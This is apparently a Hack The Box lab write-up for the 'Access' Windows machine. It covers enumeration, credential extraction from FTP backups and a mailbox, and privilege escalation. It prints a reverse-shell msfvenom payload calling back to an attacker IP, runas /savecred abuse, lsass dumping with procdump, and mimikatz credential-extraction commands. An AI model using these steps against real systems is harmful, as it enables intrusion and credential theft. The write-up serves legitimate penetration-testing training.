---
title: "[EASY] HTB-Access"
draft: false
tags:
  - htb
  - windows
  - mdb
  - mdb-tools
  - telnet
  - msfvenom
  - persistence
  - runas
  - savecred
  - lsass-dmp
  - mimikatz
  - as-rep-roasting
  - readpst
  - procdump
---
![](https://i.imgur.com/k4PGWXN.png)

## Information Gathering
Rustscan finds FTP, Telnet, and, HTTP open:
### Rustscan
```bash
┌──(yoon㉿kali)-[~/Documents/htb/access]
└─$ rustscan --addresses 10.10.10.98 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com
<snip>
Host is up, received syn-ack (0.64s latency).
Scanned at 2024-04-05 23:53:47 EDT for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
23/tcp open  telnet  syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
```

## Enumeration
### HTTP - TCP 80

Website shows nothing much:

![](https://i.imgur.com/TXwa7xF.png)

Since the web app is running on **IIS 7.5** I will run Feroxbuster with lower case directory list:

`sudo feroxbuster -u http://10.10.10.98 -n -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -C 404`

![](https://i.imgur.com/XCVa90B.png)

However, it finds nothing useful.

### FTP - TCP 21

Luckily, anonymous:anonymous login is possible:

![](https://i.imgur.com/i3Zbh5c.png)


I will download all the contents inside FTP using the command below:

`sudo wget -r --no-passive --no-parent ftp://anonymous:anonymous@10.10.10.98`

![](https://i.imgur.com/O3hfQQt.png)


## backup.mdb

Inside `/Backups`, there is **backup.mdb** file.

I can dump the tables inside using: `mdb-tables backup.mdb`:

![](https://i.imgur.com/epIjiGx.png)

Since the dump is not organized, I will make it more readable using: `mdb-tables backup.mdb | tr ' ' '\n'`

![](https://i.imgur.com/wfMYQwW.png)

I can dump the content of each table one by one using the bash script below:

```bash
#!/bin/bash

# Read the table names from the backup-mdb.tables file
while IFS= read -r table_name; do
    # Run mdb-json command for each table name
    mdb-json backup.mdb "$table_name"
done < backup-mdb.tables
```

After running the script, I will look for the keyword 'pass' and it seems like several credentials are exposed:

![](https://i.imgur.com/AWkgy4e.png)

Below I will organize the found credentials:

- admin:admin
- engineer:access4u@security
- backup_admin:admin
- John Carter:020481
- Mark Smith:010101
- Sunita Rahman:000000
- Mary Jones:666666
- Monica Nunes:123321

## Access-Control.zip

**Access Control.zip** is located in `/Engineer`.

I will try decrypting using the password found earlier **access4u@seurity** and it works:

Running `7z x -paccess4u@seurity "Access Control.zip"` dumps **Access Control.pst** file:

![](https://i.imgur.com/3XMiIk4.png)

Using **readpst**, I will dump the contents inside **Access Control.pst**:

`readpst -D -M -b -o output Access\ Control.pst`

![](https://i.imgur.com/F2JGVUE.png)

File name **2** is dumped and it seems to be a HTML Document:

![](https://i.imgur.com/hi6RygG.png)

Reading the HTML text, new credentials are exposed: **security**:**4Cc3ssC0ntr0ller**

```html
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-2009303003_-_-"


----boundary-LibPST-iamunique-2009303003_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-2009303003_-_-"

--alt---boundary-LibPST-iamunique-2009303003_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
<snip>
```


### Telnet - TCP 23

Using the credentials found from **Access Control.pst**, I will sign-in to Telnet service:

![](https://i.imgur.com/GOgwVUe.png)

Now I have a interactive shell as **security**
## Privesc: security to Administrator

From local enumeration, I see **ZKAccess3.5 Security System.lnk** file inside **C:\Users\Public\Desktop**:

![](https://i.imgur.com/bofpQHg.png)

I will take a look at the file and it seems like there is a runas command being used as **Administrator** using the save credentials:

![](https://i.imgur.com/4FvOQPy.png)

Using `cmdkey /list`, I can confirm that Administrator's password is cached:

![](https://i.imgur.com/64XfYMD.png)

In order to spawn a reverse shell as Administrator using saved credentials, I will first create a reverse shell using **msfvenom**:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=1337 -f exe > rev.exe`

![](https://i.imgur.com/eV54tur.png)

Now I will transfer reverse shell payload to target machine:

`copy \\10.10.16.12\share\rev.exe`

![](https://i.imgur.com/5HuMpHt.png)

I will execute the reverse shell payload using **runas** and **cached credential**:

`C:\Users\security\AppData\Local\Temp>runas /user:ACCESS\Administrator /savecred rev.exe`

![](https://i.imgur.com/71VrqNa.png)

Now on my local listener, shell is spawned as Administrator:

![](https://i.imgur.com/NkEeozJ.png)


## Beyond Root
### Persistence

Since recreating process to Administrator is complicated, I will try to dump password hash for the user Administrator so that I can log-in directly using Telnet Service.

#### Mimikatz

I first transfer **mimikatz.exe** to target machine:

![](https://i.imgur.com/IPbxht3.png)

I will also transfer **procdump.exe** over:

![](https://i.imgur.com/K5sQXIB.png)

Now I will dump **lsass** from **lsass.exe**

`procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`

![](https://i.imgur.com/8WuLuJL.png)

WIth **mimikatz** started, I will load the dumped lsass and open the dump file:

`sekurlsa::minidump lsass.dmp` & `sekurlsa::logonPasswords full`

![](https://i.imgur.com/D2BEZaM.png)

Luckily, mimikatz dumps plain-text password for Administrator:

![](https://i.imgur.com/Fc1KCgm.png)

Now using Telnet Service, I can sign-in directly as Administrator:

![](https://i.imgur.com/6wN5ijj.png)


## References
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
- https://abawazeeer.medium.com/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330